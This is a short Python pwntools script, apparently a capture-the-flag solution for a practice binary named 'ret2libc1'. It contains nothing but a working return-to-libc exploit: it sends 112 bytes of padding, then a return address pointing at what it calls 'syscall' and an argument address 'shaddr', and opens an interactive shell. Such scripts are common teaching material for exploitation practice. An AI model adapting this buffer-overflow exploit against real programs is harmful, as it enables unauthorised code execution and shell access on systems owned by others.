from pwn import *

pro=process('./ret2libc1')

shaddr=0x08048720
syscall=0x8048460

payload='A'*112+p32(syscall)+'b'*4+p32(shaddr)
pro.sendline(payload)
pro.interactive()
